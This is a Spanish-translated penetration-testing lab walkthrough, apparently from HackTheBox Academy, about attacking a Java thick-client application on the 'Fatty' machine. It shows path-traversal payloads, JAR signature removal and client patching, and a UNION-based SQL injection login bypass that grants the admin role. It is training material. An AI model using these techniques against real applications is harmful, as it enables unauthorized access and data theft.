# Exploiting Web Vulnerabilities in Thick-Client Applications

Las aplicaciones de clientes gruesos con una arquitectura de tres niveles tienen una ventaja de seguridad sobre aquellos con una arquitectura de dos niveles, ya que evita que el usuario final se comunique directamente con el servidor de la base de datos. Sin embargo, las aplicaciones de tres niveles pueden ser susceptibles a ataques específicos de la web como la inyección SQL y el recorrido de la ruta.

Durante las pruebas de penetración, es común que alguien encuentre una aplicación de cliente gruesa que se conecta a un servidor para comunicarse con la base de datos. El siguiente escenario demuestra un caso en el que el probador ha encontrado los siguientes archivos mientras enumera un servidor FTP que proporciona`anonymous`Acceso de usuario.

- Fatty-Client.Jar
- nota.txt
- nota2.txt
- nota3.txt

Leer el contenido de todos los archivos de texto revela que:

- Un servidor ha sido reconfigurado para ejecutarse en el puerto`1337`en lugar de`8000`.
- Esta podría ser una arquitectura de cliente gruesa/delgada donde la aplicación del cliente aún debe actualizarse para usar el nuevo puerto.
- La aplicación del cliente se basa en`Java 8`.
- Las credenciales de inicio de sesión para iniciar sesión en la aplicación del cliente son`qtc / clarabibi`.

Vamos a ejecutar el`fatty-client.jar`Archivo haciendo doble clic en él. Una vez que se inicia la aplicación, podemos iniciar sesión usando las credenciales`qtc / clarabibi`.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/err.png)

Esto no es exitoso y el mensaje`Connection Error!`se muestra. Esto probablemente se deba a que el puerto que apunta a los servidores debe actualizarse desde`8000`a`1337`. Capturemos y analicemos el tráfico de red utilizando Wireshark para confirmar esto. Una vez que se inicia Wireshark, hacemos clic en`Login`una vez más.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/wireshark.png)

A continuación se muestra un ejemplo sobre cómo abordar las solicitudes de DNS de las aplicaciones a su favor. Verifique el contenido del archivo C: \ Windows \ System32 \ Drivers \ etc \ Hosts donde la IP 172.16.17.114 apunta a Fatty.htb y Server.fatty.htb

El cliente intenta conectarse a la`server.fatty.htb`subdominio. Comencemos un símbolo del sistema como administrador y agregamos la siguiente entrada al`hosts`archivo.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts

```

La inspección del tráfico nuevamente revela que el cliente está intentando conectarse al puerto`8000`.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/port.png)

El`fatty-client.jar`es un archivo de archivo Java, y su contenido se puede extraer haciendo clic derecho en él y seleccionando`Extract files`.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> ls fatty-client\

<SNIP>
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/30/2019  12:10 PM                htb
d-----       10/30/2019  12:10 PM                META-INF
d-----        4/26/2017  12:09 AM                org
------       10/30/2019  12:10 PM           1550 beans.xml
------       10/30/2019  12:10 PM           2230 exit.png
------       10/30/2019  12:10 PM           4317 fatty.p12
------       10/30/2019  12:10 PM            831 log4j.properties
------        4/26/2017  12:08 AM            299 module-info.class
------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd

```

Ejecutemos PowerShell como administrador, navegue al directorio extraído y usemos el`Select-String`Comandar para buscar todos los archivos para el puerto`8000`.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13

```

Hay un partido en`beans.xml`. Este es un`Spring`Archivo de configuración que contiene metadatos de configuración. Leemos su contenido.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> cat fatty-client\beans.xml

<SNIP>
<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>

<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>

   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
<SNIP>

```

Editemos la línea`<constructor-arg index="1" value = "8000"/>`y configure el puerto a`1337`. Leyendo el contenido cuidadosamente, también notamos que el valor del`secret`es`clarabibiclarabibiclarabibi`. Ejecutar la aplicación editada fallará debido a un`SHA-256`Digest Mismatch. El jar está firmado, validando cada archivo`SHA-256`Hashes antes de correr. Estos hashes están presentes en el archivo`META-INF/MANIFEST.MF`.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
<SNIP>

```

Retiremos los hashes de`META-INF/MANIFEST.MF`y eliminar el`1.RSA`y`1.SF`archivos del`META-INF`directorio. El modificado`MANIFEST.MF`debe terminar con una nueva línea.

Código:TXT

```
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

```

Podemos actualizar y ejecutar el`fatty-client.jar`Archivo emitiendo los siguientes comandos.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> cd .\fatty-client
C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *

```

Entonces, hagamos doble clic en el`fatty-client-new.jar`Archivo para iniciarlo e intente iniciar sesión con las credenciales`qtc / clarabibi`.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/login.png)

Esta vez recibimos el mensaje`Login Successful!`.

---

# **Asidero para el pie**

Haciendo clic en`Profile` -> `Whoami`revela que el usuario`qtc`se asigna con el`user`role.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/profile1.png)

Haciendo clic en el`ServerStatus,`Notamos que no podemos hacer clic en ninguna opción.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/status.png)

Esto implica que puede haber otro usuario con mayores privilegios que puede usar esta función. Haciendo clic en el`FileBrowser` -> `Notes.txt`revela el archivo`security.txt`. Haciendo clic en el`Open`La opción en la parte inferior de la ventana muestra el siguiente contenido.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/security.png)

Esta nota nos informa que algunos problemas críticos en la aplicación aún deben solucionarse. Navegando al`FileBrowser` -> `Mail`La opción revela el`dave.txt`archivo que contiene información interesante. Podemos leer su contenido haciendo clic en el`Open`opción en la parte inferior de la ventana.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/dave.png)

El mensaje de Dave dice que todos`admin`Los usuarios se eliminan de la base de datos. También se refiere a un tiempo de espera implementado en el procedimiento de inicio de sesión para mitigar los ataques de inyección SQL basados en el tiempo.

---

# **Transversal de la ruta**

Dado que podemos leer archivos, intentemos un ataque de recorrido de ruta dando la siguiente carga útil en el campo y haciendo clic en el`Open`botón.

Código:TXT

```
../../../../../../etc/passwd

```

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/passwd.png)

El servidor filtra el`/`personaje de la entrada. Descompilaremos la aplicación usando[Jd-gui](http://java-decompiler.github.io/), arrastrando y dejando caer el`fatty-client-new.jar`en el`jd-gui`.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/jdgui.png)

Guarde el código fuente presionando el`Save All Sources`opción`jdgui`. Descomprimir el`fatty-client-new.jar.src.zip`haciendo clic derecho y seleccionando`Extract files`. El archivo`fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java`Maneja las características de la aplicación. Leer su contenido revela el siguiente código.

Código:Java

```java
public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {

      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account";
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!";
    return this.response.getContentAsString();
  }

```

El`showFiles`la función toma un argumento para el nombre de la carpeta y luego envía los datos al servidor utilizando el`sendAndRecv()`llamar. El archivo`fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java`Establece la opción de carpeta. Leemos su contenido.

Código:Java

```java
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            }
            textPane.setText(response);
          }
        });

```

Podemos reemplazar el`configs`nombre de carpeta con`..`como sigue.

Código:Java

```java
ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");

```

A continuación, compile el`ClientGuiTest.Java`archivo.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java

```

Esto genera varios archivos de clase. Creemos una nueva carpeta y extraemos el contenido de`fatty-client-new.jar`en él.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> mkdir raw
C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar

```

Navegar al`raw`directorio y descomprimido`fatty-client-new-2.jar`haciendo clic derecho y seleccionando`Extract Here`. Sobrescribir cualquier existente`htb/fatty/client/gui/*.class`archivos con archivos de clase actualizados.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\

```

Finalmente, construimos el nuevo archivo JAR.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> cd raw
C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .

```

Inicie sesión en la aplicación y naveguemos a`FileBrowser` -> `Config`opción.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/traverse.png)

Esto es exitoso. Ahora podemos ver el contenido del directorio`configs/../`. Los archivos`fatty-server.jar`y`start.sh`Parece interesante. Enumerar el contenido del`start.sh`el archivo revela que`fatty-server.jar`está funcionando dentro de un contenedor de Docker Alpine.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/start.png)

Podemos modificar el`open`función en`fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java`Para descargar el archivo`fatty-server.jar`como sigue.

Código:Java

```java
import java.io.FileOutputStream;
<SNIP>public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);

    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }

    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();

    return "Successfully saved the file to " + desktopPath;
}
<SNIP>
```

Reconstruya el archivo JAR siguiendo los mismos pasos e inicie sesión nuevamente en la aplicación. Entonces, navegue a`FileBrowser` -> `Config`, agregue el`fatty-server.jar`nombre en el campo de entrada y haga clic en el`Open`botón.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/download.png)

El`fatty-server.jar`El archivo se descarga con éxito en nuestro escritorio, y podemos comenzar el examen.

Explotación de vulnerabilidades web en aplicaciones de cliente grueso

```powershell
C:\> ls C:\Users\cybervaca\Desktop\

...SNIP...
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar

```

---

# **Inyección SQL**

Descompilación del`fatty-server.jar`usar jd-gui revela el archivo`htb/fatty/server/database/FattyDbSession.class`que contiene un`checkLogin()`función que maneja la funcionalidad de inicio de sesión. Esta función recupera los detalles del usuario según el nombre de usuario proporcionado. Luego compara la contraseña recuperada con la contraseña proporcionada.

Código:Java

```java
public User checkLogin(User user) throws LoginException {
    <SNIP>
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      <SNIP>if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser;
        throw new LoginException("Wrong Password!");
      <SNIP>this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;

```

Verifiquemos cómo la aplicación del cliente envía credenciales al servidor. El botón de inicio de sesión crea el nuevo objeto`ClientGuiTest.this.user`para el`User`clase. Luego llama al`setUsername()`y`setPassword()`Funciona con los respectivos valores de nombre de usuario y contraseña. Los valores que se devuelven de estas funciones se envían al servidor.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/logincode.png)

Vamos a ver el`setUsername()`y`setPassword()`funciones de`htb/fatty/shared/resources/user.java`.

Código:Java

```java
public void setUsername(String username) {
    this.username = username;
  }

  public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    }
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
  }

```

El nombre de usuario se acepta sin modificación, pero la contraseña se cambia al formato a continuación.

Código:Java

```java
sha256(username+password+"clarabibimakeseverythingsecure")

```

También notamos que el nombre de usuario no se desinfecta y se usa directamente en la consulta SQL, lo que lo hace vulnerable a la inyección de SQL.

Código:Java

```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");

```

El`checkLogin`función en`htb/fatty/server/database/FattyDbSession.class`escribe la excepción SQL a un archivo de registro.

Código:Java

```java
<SNIP>this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
<SNIP>
```

Inicie sesión en la aplicación utilizando el nombre de usuario`qtc'`Para validar la vulnerabilidad de inyección SQL revela un error de sintaxis. Para ver el error, necesitamos editar el código en el`fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java`archivo de la siguiente manera.

Código:Java

```java
ClientGuiTest.this.currentFolder = "../logs";
  try {
    response = ClientGuiTest.this.invoker.showFiles("../logs");

```

Enumerar el contenido del`error-log.txt`El archivo revela el siguiente mensaje.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/error.png)

Esto confirma que el campo de nombre de usuario es vulnerable a la inyección de SQL. Sin embargo, los intentos de inicio de sesión utilizando cargas útiles como`' or '1'='1`En ambos campos falla. Suponiendo que el nombre de usuario en el formulario de inicio de sesión sea`' or '1'='1`, el servidor procesará el nombre de usuario como se muestra a continuación.

Código:sql

```sql
SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'

```

La consulta anterior tiene éxito y devuelve el primer registro en la base de datos. Luego, el servidor crea un nuevo objeto de usuario con los resultados obtenidos.

Código:Java

```java
<SNIP>if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
<SNIP>
```

Luego compara la contraseña de usuario recién creada con la contraseña suministrada por el usuario.

Código:Java

```java
<SNIP>if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
    return newUser;
throw new LoginException("Wrong Password!");
<SNIP>
```

Luego, el siguiente valor es producido por`newUser.getPassword()`función.

Código:Java

```java
sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046

```

La contraseña suministrada por el usuario hash`user.getPassword()`se calcula de la siguiente manera.

Código:Java

```java
sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8

```

Aunque el hash enviado al servidor por el cliente no coincide con el de la base de datos, y la comparación de contraseña falla, la inyección SQL aún es posible utilizando`UNION`consultas. Consideremos el siguiente ejemplo.

Código:sql

```sql
MariaDB [userdb]> select * from users where username='john';
+----------+-------------+
| username | password    |
+----------+-------------+
| john     | password123 |
+----------+-------------+

```

Es posible crear entradas falsas usando el`SELECT`operador. Ingresemos un nombre de usuario no válido para crear una nueva entrada del usuario.

Código:sql

```sql
MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
+----------+-------------+
| username | password    |
+----------+-------------+
| admin    | welcome123  |
+----------+-------------+

```

Del mismo modo, la inyección en el`username`El campo se puede aprovechar para crear una entrada de usuario falsa.

Código:Java

```java
test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin

```

De esta manera, la contraseña y el rol asignado pueden controlarse. El siguiente fragmento de código envía la contraseña de texto sin formato ingresado en el formulario. Vamos a modificar el código en`htb/fatty/shared/resources/User.java`Para enviar la contraseña como es de la aplicación del cliente.

Código:Java

```java
public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
public void setPassword(String password) {
    this.password = password;
  }

```

Ahora podemos reconstruir el archivo jar e intentar iniciar sesión usando la carga útil`abc' UNION SELECT 1,'abc','a@b.com','abc','admin`en el`username`campo y el texto aleatorio`abc`en el`password`campo.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/bypass.png)

El servidor eventualmente procesará la siguiente consulta.

Código:sql

```sql
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'

```

La primera consulta de selección falla, mientras que el segundo devuelve los resultados válidos del usuario con el rol`admin`y la contraseña`abc`. La contraseña enviada al servidor también es`abc`, que da como resultado una comparación de contraseña exitosa, y la aplicación nos permite iniciar sesión como usuario`admin`.

![](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/admin.png)